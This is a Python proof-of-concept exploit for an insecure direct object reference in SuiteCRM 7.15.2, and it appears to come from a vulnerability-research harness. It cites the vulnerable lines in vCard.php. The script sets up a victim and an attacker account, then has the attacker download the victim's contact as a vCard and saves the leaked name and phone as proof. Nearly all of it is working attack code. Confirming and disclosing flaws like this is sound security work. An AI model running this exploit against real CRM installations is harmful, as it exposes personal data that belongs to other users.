#!/usr/bin/env python3
"""
VULN-004 -- vCard.php cross-user PII export via ACL-less loadContact() (IDOR)

Target: SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sinks:
  vCard.php:54-60          -- $vcard->loadContact($_REQUEST['contact_id'], $module)
  include/vCard.php:60-66  -- loadContact() does `$contact->retrieve($contactid)`
                               with no ACLAccess/ownership check, then serialises
                               name/birthdate/phones/email/address/org (vCard.php:76-89).
Entry point registered `auth => true` (any authenticated session), not gated
by any module-specific ACL -- include/MVC/Controller/entry_point_registry.php:52.

What this script does
----------------------
1. Creates victim V and attacker A (fresh, unrelated low-priv users).
2. As V: creates a Contact with a unique name and a unique work-phone
   marker -- owned by V, never shared with A.
3. As A: GETs entryPoint=vCard&module=Contacts&contact_id=<victim contact>
   and asserts the returned vCard body contains V's full name AND the
   phone marker (fields that only exist because vCard.php read the real
   bean, not just echoed the id back).

Environment variables:
    BASE_URL, ADMIN_USER, ADMIN_PASS
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login)

VULN_ID = "VULN-004"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "vCard.php cross-user PII export via ACL-less loadContact() (IDOR)")

    log("SETUP", "admin web login; provisioning victim (V) and attacker (A)")
    admin = admin_session()
    victim = create_user(admin, "Victim@2026x!")
    attacker = create_user(admin, "Attacker@2026x!")
    log("INFO", f"victim   = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']})")

    vs = web_login(victim["user_name"], victim["password"])

    log("SETUP", "as V: create a Contact with a unique name + phone marker, owned by V")
    last = rand("V004Contact")
    phone_marker = "555-" + rand("x")[2:8]
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Contacts", "action": "Save", "record": "",
        "first_name": "Victim004", "last_name": last, "phone_work": phone_marker,
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Contacts&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim Contact (status={r.status_code})")
        sys.exit(1)
    contact_id = m.group(1)
    log("OK", f"Contact created: {contact_id} last_name={last!r} phone_work={phone_marker!r}, owned by V")

    as_ = web_login(attacker["user_name"], attacker["password"])

    log("STEP", "as A (zero relationship to V's Contact): export it as a vCard")
    params = {"entryPoint": "vCard", "module": "Contacts", "contact_id": contact_id}
    url = f"{BASE_URL}/index.php?" + "&".join(f"{k}={v}" for k, v in params.items())

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"GET {url.replace(BASE_URL, '')} HTTP/1.1\n")
        f.write("Host: localhost:33116\nCookie: PHPSESSID=<attacker-session>\n")

    r2 = as_.get(f"{BASE_URL}/index.php", params=params, timeout=30)

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {r2.status_code} {r2.reason}\n")
        for k, v in r2.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(r2.text)

    name_hit = last in r2.text
    phone_hit = phone_marker in r2.text
    is_vcard = "text/x-vcard" in r2.headers.get("Content-Type", "")
    log("PROOF", f"status={r2.status_code} Content-Type={r2.headers.get('Content-Type')!r}")
    log("PROOF", f"victim last_name {last!r} present in vCard: {name_hit}")
    log("PROOF", f"victim phone_work marker {phone_marker!r} present in vCard: {phone_hit}")

    if not (is_vcard and name_hit and phone_hit):
        verdict(VULN_ID, "FAILED", "attacker did not receive victim's PII via vCard export")
        sys.exit(1)

    with open(os.path.join(HERE, "evidence", "leaked_vcard.txt"), "w") as f:
        f.write(f"Victim contact id: {contact_id}\n\n")
        f.write("Full vCard returned to attacker:\n")
        f.write(r2.text)

    log("OK", f"attacker downloaded a {r2.headers.get('Content-Type')} vCard containing V's name + phone")
    verdict(VULN_ID, "CONFIRMED",
            f"attacker exported V's Contact PII (name={last}, phone={phone_marker}) via vCard, no ACL check")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
